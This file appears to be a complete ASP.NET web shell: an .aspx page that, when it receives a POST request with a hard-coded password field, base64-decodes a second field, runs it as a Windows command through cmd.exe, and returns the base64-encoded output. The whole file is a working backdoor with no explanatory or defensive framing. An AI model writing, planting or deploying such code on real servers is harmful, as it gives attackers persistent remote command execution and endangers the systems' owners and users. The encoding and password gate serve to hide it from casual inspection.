<%@ Page Language="C#"%>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO"%>

<script runat="server">
    private const string AUTHKEY = "UGFzc3dvcmQxMjM0NTY3ODk";
    protected void Page_Load(object sender, EventArgs e)
    {    
        string data1 = Request.Form["data1"];
        if (data1 != AUTHKEY)
        {          
            return;
        }
        string data2 = Request.Form["data2"];
        byte[] outbyte = Convert.FromBase64String(data2);
        string payload = Encoding.Default.GetString(outbyte);              
        string outstr1 = ExecuteCommand(payload);
        byte[] enbytes = Encoding.Default.GetBytes(outstr1);
        string outstr2 = Convert.ToBase64String(enbytes);
        Response.Write(outstr2);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;
            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>



